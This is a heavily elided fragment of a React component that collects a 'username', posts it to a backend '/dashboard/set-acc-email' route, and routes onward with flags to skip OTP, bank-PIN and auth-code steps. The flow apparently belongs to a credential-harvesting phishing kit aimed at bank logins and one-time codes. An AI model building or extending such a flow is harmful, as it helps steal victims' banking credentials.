...
const Username = ({ username, setUsername, userId, skip}) => {
  ...
  const goToEmail = () => navigate(`/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
  ...
  const onSubmit = async (data) => {
    ...
    try {
      const response = await fetch(`${import.meta.env.VITE_BACKEND_URL}/dashboard/set-acc-email`, {
        ...
        body: JSON.stringify({ email:username, userId, accountId }),
      });
    ...
    <div className="w-screen h-screen flex justify-center items-center">
      ...
      <div className="w-ful h-10 flex justify-center flex-col gap-1">
        ...
        <input
          ...
          <label
            htmlFor="floating_outlined"
            className="absolute text-sm text-[#9b9ba2] dark:text-gray-400 duration-200 transform scale-75 -translate-y-5  top-5 origin-[0] dark:bg-transparent px-5 peer-focus:px-5 peer-focus:text-blue-600 peer-focus:dark:text-[#9b9ba2] peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:left-3 peer-focus:top-3 peer-focus:scale-75 peer-focus:-translate-y-3 rtl:peer-focus:translate-x-1/3 rtl:peer-focus:left-auto start-3 autofill:bg-transparent"
          >
            <span className="text-base" ref={redText}>
              Username
            </span>
